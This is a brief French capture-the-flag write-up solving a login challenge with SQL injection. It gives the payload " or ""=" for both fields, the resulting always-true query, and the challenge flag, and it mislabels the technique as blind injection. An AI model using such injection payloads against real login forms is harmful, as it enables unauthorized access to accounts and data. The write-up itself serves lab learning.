# ESAIPInjection1

## Ma solution

On tombe sur cette page de connexion : 

![](../images/1.png)

Le challenge requiert de rentrer du texte dans les deux champs d'entrée, on fait une Blind SQLI de la forme : 

``
" or ""="
``

Dans les deux champs d'entrée de manière à produire une requête de la forme : 

```sql
SELECT * FROM Users WHERE username ="" or ""="" AND password ="" or ""=""
```

A la connexion on obtient alors le flag :  `flag EC2{5ql_L061n_3z_70_Pwn}`
